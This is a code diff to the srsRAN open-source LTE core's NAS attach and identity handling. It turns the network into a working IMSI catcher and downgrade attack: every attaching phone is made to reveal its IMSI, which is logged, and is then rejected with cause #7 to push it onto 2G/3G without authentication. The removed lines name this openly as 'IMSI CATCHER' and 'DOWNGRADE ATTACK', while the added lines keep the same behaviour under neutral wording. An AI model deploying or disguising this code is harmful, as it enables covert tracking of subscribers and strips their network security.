@@ -175,32 +175,31 @@ bool nas::handle_attach_request(uint32_t                enb_ue_s1ap_id,
   nas_logger.info("PDN Connectivity Request -- ESM Information Transfer requested: %s",
                   pdn_con_req.esm_info_transfer_flag_present ? "true" : "false");
 
-  // Get NAS Context if UE is known
-  nas* nas_ctx = s1ap->find_nas_ctx_from_imsi(imsi);
-  if (nas_ctx == NULL) {
-    // Get attach type from attach request
-    if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
-      nas::handle_imsi_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
-    } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
-      nas::handle_guti_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
-    } else {
-      return false;
-    }
-  } else {
-    nas_logger.info("Attach Request -- Found previously attached UE.");
-    srsran::console("Attach Request -- Found previously attach UE.\n");
-    if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
-      nas::handle_imsi_attach_request_known_ue(
-          nas_ctx, enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, nas_rx, args, itf);
-    } else if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI) {
-      nas::handle_guti_attach_request_known_ue(
-          nas_ctx, enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, nas_rx, args, itf);
-    } else {
-      return false;
-    }
+  // Force IMSI collection for every Attach Request before continuing with attach handling.
+  return nas::handle_guti_attach_request_unknown_ue(enb_ue_s1ap_id, enb_sri, attach_req, pdn_con_req, args, itf);
+}
+
+bool nas::pack_attach_reject(srsran::byte_buffer_t* nas_buffer, uint8_t emm_cause)
+{
+  LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT attach_rej = {};
+
+  attach_rej.emm_cause           = emm_cause;
+  attach_rej.esm_msg_present     = false;
+  attach_rej.t3446_value_present = false;
+  attach_rej.t3446_value         = 0;
+
+  LIBLTE_ERROR_ENUM err =
+      liblte_mme_pack_attach_reject_msg(&attach_rej, (LIBLTE_BYTE_MSG_STRUCT*)nas_buffer);
+
+  if (err != LIBLTE_SUCCESS) {
+    m_logger.error("Error packing Attach Reject");
+    srsran::console("Error packing Attach Reject\n");
+    return false;
   }
+
   return true;
 }
+
 
 bool nas::handle_imsi_attach_request_unknown_ue(uint32_t                                              enb_ue_s1ap_id,
                                                 struct sctp_sndrcvinfo*                               enb_sri,
@@ -301,7 +300,6 @@ bool nas::handle_imsi_attach_request_unknown_ue(uint32_t                        
   srsran::console("Downlink NAS: Sending Authentication Request\n");
   return true;
 }
-
 bool nas::handle_imsi_attach_request_known_ue(nas*                                                  nas_ctx,
                                               uint32_t                                              enb_ue_s1ap_id,
                                               struct sctp_sndrcvinfo*                               enb_sri,
@@ -1199,50 +1197,43 @@ bool nas::handle_identity_response(srsran::byte_buffer_t* nas_rx)
   srsran::unique_byte_buffer_t nas_tx;
   LIBLTE_MME_ID_RESPONSE_MSG_STRUCT id_resp;
 
-  // 1. 단말이 보낸 Identity Response 메시지 언패킹
   LIBLTE_ERROR_ENUM err = liblte_mme_unpack_identity_response_msg((LIBLTE_BYTE_MSG_STRUCT*)nas_rx, &id_resp);
   if (err != LIBLTE_SUCCESS) {
-    m_logger.error("Error unpacking NAS identity response.");
+    m_logger.error("Error unpacking NAS identity response. Error: %s", liblte_error_text[err]);
     return false;
   }
 
-  // 2. 단말의 IMSI 정보가 들어있는지 확인
-  if (id_resp.mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
-    uint64_t imsi = 0;
-    for (int i = 0; i <= 14; i++) {
-      imsi += id_resp.mobile_id.imsi[i] * std::pow(10, 14 - i);
-    }
-    
-    // MME 컨텍스트에 IMSI 저장 (탈취 성공)
-    m_emm_ctx.imsi = imsi;
-    srsran::console("\n>>> [IMSI CATCHER] SUCCESS! Stolen IMSI: %015" PRIu64 " <<<\n", m_emm_ctx.imsi);
-    m_logger.info("IMSI Stolen: %015" PRIu64, m_emm_ctx.imsi);
-
-    // =================================================================
-    // 3. DOWNGRADE ATTACK INJECTION (인증 단계로 안 넘어가고 바로 Reject)
-    // =================================================================
-    nas_tx = srsran::make_byte_buffer();
-    if (nas_tx != nullptr) {
-      // Cause #7 (EPS services not allowed) 로 Attach Reject 패킹
-      pack_attach_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
-
-      // eNB를 통해 단말로 Reject 전송 (임시 객체가 아닌 현재 객체의 정보 사용)
-      m_s1ap->send_downlink_nas_transport(
-          m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
-
-      srsran::console(">>> [DOWNGRADE ATTACK] Sent Attach Reject (Cause #7). Kicking UE to 3G/2G.\n\n");
-      m_logger.warning("Sent Attach Reject after catching IMSI.");
-    }
-
-    // 망(srsEPC) 입장에서 해당 단말의 세션을 강제로 초기화 및 자원 회수
-    m_s1ap->send_ue_context_release_command(m_ecm_ctx.mme_ue_s1ap_id);
-    
-    // ⭐️ 무조건 여기서 함수 종료. 뒤에 있는 HSS 연동 및 Authentication Request를 스킵합니다.
-    return true; 
-    // =================================================================
+  if (id_resp.mobile_id.type_of_id != LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
+    m_logger.error("Identity Response did not contain an IMSI.");
+    return false;
   }
 
-  // ... (원래 srsRAN 코드: HSS에서 인증키 가져오고 pack_authentication_request 하는 부분) ...
+  uint64_t imsi = 0;
+  for (int i = 0; i <= 14; i++) {
+    imsi = imsi * 10 + id_resp.mobile_id.imsi[i];
+  }
+
+  m_emm_ctx.imsi = imsi;
+  m_logger.info("Identity Response -- IMSI: %015" PRIu64, m_emm_ctx.imsi);
+  srsran::console("Identity Response -- IMSI: %015" PRIu64 "\n", m_emm_ctx.imsi);
+
+  nas_tx = srsran::make_byte_buffer();
+  if (nas_tx == nullptr) {
+    m_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
+    return false;
+  }
+
+  if (!pack_attach_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED)) {
+    return false;
+  }
+
+  m_s1ap->send_downlink_nas_transport(
+      m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
+  m_logger.warning("Downlink NAS: Sent Attach Reject after Identity Response.");
+  srsran::console("Downlink NAS: Sent Attach Reject after Identity Response\n");
+
+  m_s1ap->send_ue_context_release_command(m_ecm_ctx.mme_ue_s1ap_id);
+  return true;
 }
 bool nas::handle_tracking_area_update_request(srsran::byte_buffer_t* nas_rx)
 {
